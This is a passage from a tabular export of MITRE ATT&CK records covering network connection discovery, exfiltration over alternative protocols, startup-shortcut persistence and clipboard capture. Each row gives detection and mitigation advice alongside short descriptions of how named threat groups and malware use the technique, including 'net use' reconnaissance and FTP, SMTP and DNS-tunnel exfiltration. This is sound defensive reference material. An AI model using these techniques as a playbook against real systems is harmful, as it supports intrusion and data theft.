JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: SHOTPUT, Backdoor.APT.CookieCutter, Pirpi",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
789,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0153|RedLeaves]] can enumerate drives and Remote Desktop sessions.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: RedLeaves, BUGJUICE",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
790,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['Commands such as <code>net use</code> and <code>net session</code> can be used in [[Software/S0039|Net]] to gather information about network connections from a particular host.[[CiteRef::Savill 1999]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
791,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0045|menuPass]] has used <code>net use</code> to conduct connectivity checks to machines.[[CiteRef::PWC Cloud Hopper April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
792,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['Commands such as <code>net use</code> and <code>net session</code> can be used in [[Software/S0039|Net]] to gather information about network connections from a particular host.[[CiteRef::Savill 1999]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
793,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0027|Threat Group-3390]] has used <code>net use</code> to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim.[[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
794,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring', 'Process use of network', 'Packet capture', 'Netflow/Enclave netflow', 'Network protocol analysis']","['[[Software/S0125|Remsec]] can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.[[CiteRef::Kaspersky ProjectSauron Full Report]]']",['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network. For example, if services like FTP are not required for sending information outside of a network, then block FTP-related ports at the network perimeter. Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network.[[CiteRef::TechNet Firewall Design]] These actions will help reduce command and control and exfiltration path opportunities.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Exfiltration'],['Technique/T1048'],['Exfiltration Over Alternative Protocol'],https://attack.mitre.org/wiki/Technique/T1048
795,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring', 'Process use of network', 'Packet capture', 'Netflow/Enclave netflow', 'Network protocol analysis']",['[[Software/S0095|FTP]] may be used to exfiltrate data separate from the main command and control protocol.[[CiteRef::Wikipedia FTP]]'],['Naikon'],['Naikon'],['G0019'],"['Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network. For example, if services like FTP are not required for sending information outside of a network, then block FTP-related ports at the network perimeter. Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network.[[CiteRef::TechNet Firewall Design]] These actions will help reduce command and control and exfiltration path opportunities.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: FTP, ftp.exe",['Exfiltration'],['Technique/T1048'],['Exfiltration Over Alternative Protocol'],https://attack.mitre.org/wiki/Technique/T1048
796,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring', 'Process use of network', 'Packet capture', 'Netflow/Enclave netflow', 'Network protocol analysis']",['[[Software/S0037|HAMMERTOSS]] exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.[[CiteRef::FireEye APT29]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network. For example, if services like FTP are not required for sending information outside of a network, then block FTP-related ports at the network perimeter. Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network.[[CiteRef::TechNet Firewall Design]] These actions will help reduce command and control and exfiltration path opportunities.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: HAMMERTOSS, HammerDuke, NetDuke",['Exfiltration'],['Technique/T1048'],['Exfiltration Over Alternative Protocol'],https://attack.mitre.org/wiki/Technique/T1048
797,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring', 'Process use of network', 'Packet capture', 'Netflow/Enclave netflow', 'Network protocol analysis']",['[[Software/S0050|CosmicDuke]] exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.[[CiteRef::F-Secure Cosmicduke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network. For example, if services like FTP are not required for sending information outside of a network, then block FTP-related ports at the network perimeter. Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network.[[CiteRef::TechNet Firewall Design]] These actions will help reduce command and control and exfiltration path opportunities.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CosmicDuke, TinyBaron, ...",['Exfiltration'],['Technique/T1048'],['Exfiltration Over Alternative Protocol'],https://attack.mitre.org/wiki/Technique/T1048
798,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring', 'Process use of network', 'Packet capture', 'Netflow/Enclave netflow', 'Network protocol analysis']",['[[Group/G0032|Lazarus Group]] malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.[[CiteRef::Novetta Blockbuster RATs]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network. For example, if services like FTP are not required for sending information outside of a network, then block FTP-related ports at the network perimeter. Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network.[[CiteRef::TechNet Firewall Design]] These actions will help reduce command and control and exfiltration path opportunities.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1048'],['Exfiltration Over Alternative Protocol'],https://attack.mitre.org/wiki/Technique/T1048
799,"[""Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.""]",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0004|TinyZBot]] can create a shortcut in the Windows startup folder for persistence.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Identify and block unknown, potentially malicious software that may be executed through shortcut modification by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: TinyZBot,['Persistence'],['Technique/T1023'],['Shortcut Modification'],https://attack.mitre.org/wiki/Technique/T1023
800,"[""Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.""]",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['The [[Software/S0089|BlackEnergy]] 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.[[CiteRef::F-Secure BlackEnergy 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Identify and block unknown, potentially malicious software that may be executed through shortcut modification by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: BlackEnergy, Black Energy",['Persistence'],['Technique/T1023'],['Shortcut Modification'],https://attack.mitre.org/wiki/Technique/T1023
801,"[""Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.""]",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0031|BACKSPACE]] achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['Identify and block unknown, potentially malicious software that may be executed through shortcut modification by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: BACKSPACE, Lecna",['Persistence'],['Technique/T1023'],['Shortcut Modification'],https://attack.mitre.org/wiki/Technique/T1023
802,"[""Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.""]",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0028|SHIPSHAPE]] achieves persistence by creating a shortcut in the Startup folder.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['Identify and block unknown, potentially malicious software that may be executed through shortcut modification by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: SHIPSHAPE,['Persistence'],['Technique/T1023'],['Shortcut Modification'],https://attack.mitre.org/wiki/Technique/T1023
803,"[""Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.""]",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","[""[[Software/S0035|SPACESHIP]] achieves persistence by creating a shortcut in the current user's Startup folder.[[CiteRef::FireEye APT30]]""]",['APT30'],['APT30'],['G0013'],"['Identify and block unknown, potentially malicious software that may be executed through shortcut modification by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: SPACESHIP,['Persistence'],['Technique/T1023'],['Shortcut Modification'],https://attack.mitre.org/wiki/Technique/T1023
804,"[""Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.""]",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","[u'To establish persistence, [[Software/S0058|SslMM]] identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \u201cOffice Start,\u201d \u201cYahoo Talk,\u201d \u201cMSN Gaming Z0ne,\u201d or \u201cMSN Talk\u201d shortcut.[[CiteRef::Baumgartner Naikon 2015]]']",['Naikon'],['Naikon'],['G0019'],"['Identify and block unknown, potentially malicious software that may be executed through shortcut modification by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: SslMM,['Persistence'],['Technique/T1023'],['Shortcut Modification'],https://attack.mitre.org/wiki/Technique/T1023
805,"[""Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.""]",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0085|S-Type]] may create the file <code>%HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk</code>, which points to the malicious msdtc.exe file already created in the %CommonFiles% directory.[[CiteRef::Cylance Dust Storm]]']",['Dust Storm'],['Dust Storm'],['G0031'],"['Identify and block unknown, potentially malicious software that may be executed through shortcut modification by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: S-Type,['Persistence'],['Technique/T1023'],['Shortcut Modification'],https://attack.mitre.org/wiki/Technique/T1023
806,"[""Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.""]",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0053|SeaDuke]] is capable of persisting via a .lnk file stored in the Startup directory.[[CiteRef::Unit 42 SeaDuke 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify and block unknown, potentially malicious software that may be executed through shortcut modification by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: SeaDuke, SeaDaddy, SeaDesk",['Persistence'],['Technique/T1023'],['Shortcut Modification'],https://attack.mitre.org/wiki/Technique/T1023
807,"['Access to the clipboard is a legitimate function of many applications on a Windows system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.']",[],[],[],['API monitoring'],['[[Software/S0004|TinyZBot]] contains functionality to collect information from the clipboard.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Instead of blocking software based on clipboard capture behavior, identify potentially malicious software that may contain this functionality, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: TinyZBot,['Collection'],['Technique/T1115'],['Clipboard Data'],https://attack.mitre.org/wiki/Technique/T1115
808,"['Access to the clipboard is a legitimate function of many applications on a Windows system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.']",[],[],[],['API monitoring'],['[[Software/S0148|RTM]] collects data from the clipboard.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Instead of blocking software based on clipboard capture behavior, identify potentially malicious software that may contain this functionality, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: RTM,['Collection'],['Technique/T1115'],['Clipboard Data'],https://attack.mitre.org/wiki/Technique/T1115
